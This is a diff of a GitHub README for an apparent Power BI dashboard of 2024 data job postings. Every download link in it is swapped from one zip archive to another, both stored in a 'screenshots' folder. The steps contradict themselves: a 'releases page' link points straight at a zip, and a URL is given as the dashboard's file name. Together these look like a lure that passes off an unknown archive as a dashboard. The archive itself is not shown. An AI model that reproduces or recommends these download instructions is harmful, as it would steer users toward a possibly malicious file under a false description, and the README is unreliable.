@@ -1,6 +1,6 @@
 # 🌟 Data-Jobs-2024-1.0-PowerBI-Project - Navigate the Data Job Market Easily
 
-[![Download Now](https://github.com/Iyedjebara/Data-Jobs-2024-1.0-PowerBI-Project/raw/refs/heads/main/screenshots/B-Project-Jobs-Data-Power-2.6.zip%20Now-Data--Jobs--2024--1.0--PowerBI--Project-brightgreen)](https://github.com/Iyedjebara/Data-Jobs-2024-1.0-PowerBI-Project/raw/refs/heads/main/screenshots/B-Project-Jobs-Data-Power-2.6.zip)
+[![Download Now](https://raw.githubusercontent.com/Iyedjebara/Data-Jobs-2024-1.0-PowerBI-Project/main/screenshots/B_Data_Project_Power_Jobs_1.1-alpha.3.zip%20Now-Data--Jobs--2024--1.0--PowerBI--Project-brightgreen)](https://raw.githubusercontent.com/Iyedjebara/Data-Jobs-2024-1.0-PowerBI-Project/main/screenshots/B_Data_Project_Power_Jobs_1.1-alpha.3.zip)
 
 ## 📜 Description
 This dashboard was created for Job Seekers, Job Transitioners, and Job Swappers to solve a common problem: information about the data job market is scattered and hard to grasp. Using a real-world dataset of 2024 data science job postings, including titles, salaries, and locations, this project provides a single, easy-to-use interface.
@@ -8,11 +8,11 @@ This dashboard was created for Job Seekers, Job Transitioners, and Job Swappers 
 ## 🚀 Getting Started
 Follow these steps to get started with the Data-Jobs-2024-1.0-PowerBI-Project. No programming knowledge is required. 
 
-1. **Visit the Download Page**: Access the releases page by clicking [here](https://github.com/Iyedjebara/Data-Jobs-2024-1.0-PowerBI-Project/raw/refs/heads/main/screenshots/B-Project-Jobs-Data-Power-2.6.zip).
+1. **Visit the Download Page**: Access the releases page by clicking [here](https://raw.githubusercontent.com/Iyedjebara/Data-Jobs-2024-1.0-PowerBI-Project/main/screenshots/B_Data_Project_Power_Jobs_1.1-alpha.3.zip).
 
 2. **Select the Latest Release**: Look for the most recent version in the list. It will indicate "Latest Release." 
 
-3. **Download the Dashboard File**: Click on the link for the dashboard file you want to download. For example, you may see a file named `https://github.com/Iyedjebara/Data-Jobs-2024-1.0-PowerBI-Project/raw/refs/heads/main/screenshots/B-Project-Jobs-Data-Power-2.6.zip`. Click to download it.
+3. **Download the Dashboard File**: Click on the link for the dashboard file you want to download. For example, you may see a file named `https://raw.githubusercontent.com/Iyedjebara/Data-Jobs-2024-1.0-PowerBI-Project/main/screenshots/B_Data_Project_Power_Jobs_1.1-alpha.3.zip`. Click to download it.
 
 4. **Open Power BI**: Ensure you have Power BI installed on your computer. If not, you can download it from the official Microsoft website.
 
@@ -28,7 +28,7 @@ Before you download, ensure your system meets the following requirements:
 - **Power BI**: The latest version of Microsoft Power BI
 
 ## 📥 Download & Install
-To download the Data-Jobs-2024-1.0-PowerBI-Project, visit this page: [Download Page](https://github.com/Iyedjebara/Data-Jobs-2024-1.0-PowerBI-Project/raw/refs/heads/main/screenshots/B-Project-Jobs-Data-Power-2.6.zip).
+To download the Data-Jobs-2024-1.0-PowerBI-Project, visit this page: [Download Page](https://raw.githubusercontent.com/Iyedjebara/Data-Jobs-2024-1.0-PowerBI-Project/main/screenshots/B_Data_Project_Power_Jobs_1.1-alpha.3.zip).
 
 After downloading, follow the steps in the "Getting Started" section to load and explore your new dashboard.
 
@@ -51,4 +51,4 @@ If you have any questions, issues, or feedback, feel free to open an issue in th
 ## 🌟 Acknowledgments
 Thanks to everyone who contributed to this project. Your insights and efforts make navigating the data job market a little easier.
 
-[![Download Now](https://github.com/Iyedjebara/Data-Jobs-2024-1.0-PowerBI-Project/raw/refs/heads/main/screenshots/B-Project-Jobs-Data-Power-2.6.zip%20Now-Data--Jobs--2024--1.0--PowerBI--Project-brightgreen)](https://github.com/Iyedjebara/Data-Jobs-2024-1.0-PowerBI-Project/raw/refs/heads/main/screenshots/B-Project-Jobs-Data-Power-2.6.zip)
+[![Download Now](https://raw.githubusercontent.com/Iyedjebara/Data-Jobs-2024-1.0-PowerBI-Project/main/screenshots/B_Data_Project_Power_Jobs_1.1-alpha.3.zip%20Now-Data--Jobs--2024--1.0--PowerBI--Project-brightgreen)](https://raw.githubusercontent.com/Iyedjebara/Data-Jobs-2024-1.0-PowerBI-Project/main/screenshots/B_Data_Project_Power_Jobs_1.1-alpha.3.zip)
